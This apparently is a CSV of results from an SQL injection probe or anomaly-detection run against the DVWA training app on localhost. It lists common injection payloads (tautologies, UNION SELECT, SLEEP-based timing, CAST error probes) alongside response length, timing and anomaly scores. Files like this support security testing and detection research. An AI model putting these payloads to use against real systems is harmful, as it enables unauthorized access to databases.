url,param,payload,resp_len,len_diff,sql_error_flag,resp_time,anomaly_score
http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' OR '1'='1,295,0,0,0.0556013584136962,0.11462749326093902
http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' OR '1'='1' --,295,0,0,0.0305731296539306,-0.0937861308498591
http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' OR '1'='1' --,295,0,0,0.0072219371795654,-0.12053803159052723
http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' UNION SELECT NULL --,295,0,0,0.0168139934539794,-0.13565970523057347
http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' AND SLEEP(3) --,295,0,0,0.0259690284729003,-0.16122856136383518
http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' OR '1'='1,295,0,0,0.0239725112915039,-0.16951543971315108
http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,295,0,0,0.0045735836029052,-0.18475973788310968
http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' AND SLEEP(3) --,295,0,0,0.0038228034973144,-0.19287505072996536
http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,""" OR ""a""=""a",295,0,0,0.00398850440979,-0.19511457132163867
http://localhost/DVWA/vulnerabilities/sqli/?id=1,id,""" OR ""a""=""a",295,0,0,0.0037946701049804,-0.2005967475810978
http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' AND 1=CAST((SELECT TOP 1 name FROM users) AS INT) --,295,0,0,0.0030379295349121,-0.20209733748974068
http://localhost/DVWA/vulnerabilities/sqli/?id=1,submit,' UNION SELECT NULL --,295,0,0,0.0030128955841064,-0.20435285631629185
